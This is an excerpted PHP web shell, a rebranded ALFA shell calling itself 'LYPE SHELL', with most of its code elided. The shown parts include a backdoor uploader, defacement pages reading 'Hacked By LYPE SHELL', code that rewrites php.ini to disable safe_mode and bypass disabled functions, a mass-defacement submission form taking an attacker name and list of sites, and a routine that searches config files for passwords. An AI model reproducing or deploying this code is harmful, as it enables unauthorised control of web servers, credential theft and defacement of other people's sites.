...
define("__ALFA_CODE_NAME__", "LYPE SHELL");
define("__ALFA_DATA_FOLDER__", "LYPE SHELL");
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"main_red_perm" => "#02b602",
		"main_white_perm" => "#02b602",
		"beetween_perms" => "#02b602",
		"main_actions" => array(
			"key_color" => "#02b602",
			"multi_selector" => array(
...
<title>~ Hidden Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="LYPE SHELL 2012" draggable="false" src="https://mariterbang.io/download/YVMPdsno.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ LYPE SHELL Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="LYPE SHELL 2012" draggable="false" src="https://mariterbang.io/download/YVMPdsno.png" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['loader']='https://mariterbang.io/download/YVMPdsno.png';
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('LYPE SHELL is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>LYPE SHELL Uploader</option><option value='my'>My Private Shell</option></select>";
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://mariterbang.io/download/YVMPdsno.png'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By LYPE SHELL (LYPE SHELL)</font><br>
...
<font color='#02b602'>Skype : Tony_33â„¢</font><br>
<font color='#02b602'>Persian Gulf For Ever</font><br>
<font color='#02b602'>Iranian Programmers</font><br>
<font color='#02b602'>############</font><br>
...
$disabled_btn_style= 'background: #02b602;color: #fff;';
}
if(!empty($_POST['alfa3'])){
...
<textarea name=index rows='19' cols='103'><title>Hacked By LYPE SHELL</title><b>Hacked By LYPE SHELL</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By LYPE SHELL</title><b>Hacked By LYPE SHELL</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
echo __pre()."<center><table border='1'><tr><td><b><font color=\"#02b602\">User: </b></font></td><td><b><font color=\"#02b602\">{$user}</font></b></td></tr><tr><td><b><font color=\"#02b602\">site: </b></font></td><td><b><font color=\"#02b602\">{$rep}</font></b></td></tr></table></center>";
...
<tr><td><b><font color=\"#02b602\">User: </b></font></td><td><b><font color=\"#02b602\">".trim($ex[1])."</font></b></td></tr>
<tr><td><b><font color=\"#02b602\">site: </b></font></td><td><b><font color=\"#02b602\">{$rep}</font></b></td></tr></table></center>";break;}}}}}
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By LYPE SHELL(LYPE SHELL)");
...
<input type="text" name="defacer" size="67" id="text" placeholder="LYPE SHELL 2012" />
<br>
...
$site = $_POST['alfa4'];
if(empty($hacker)){
die (__pre()."<center><b><font color =\"#02b602\">[+] YOU MUST FILL THE ATTACKER NAME [+]</font></b></center>");
}elseif($method == "------------------------------------SELECT-------------------------------------"){
die(__pre()."<center><b><font color =\"#02b602\">[+] YOU MUST SELECT THE METHOD [+]</b></font></center>");
}elseif($neden == "------------------------------------SELECT-------------------------------------"){
die(__pre()."<center><b><font color =\"#02b602\">[+] YOU MUST SELECT THE REASON [+]</b></font></center>");
}elseif(empty($site)){
die(__pre()."<center><b><font color =\"#02b602\">[+] YOU MUST INTER THE SITES LIST [+]<font></b></center>");
}
$i = 0;
$sites = explode("\n", $site);
$alfa = new AlfaCURL();
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://mariterbang.io/download/YVMPdsno.png\"></p>";
...
echo "<b><font color=\"#02b602\">[~] Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>";
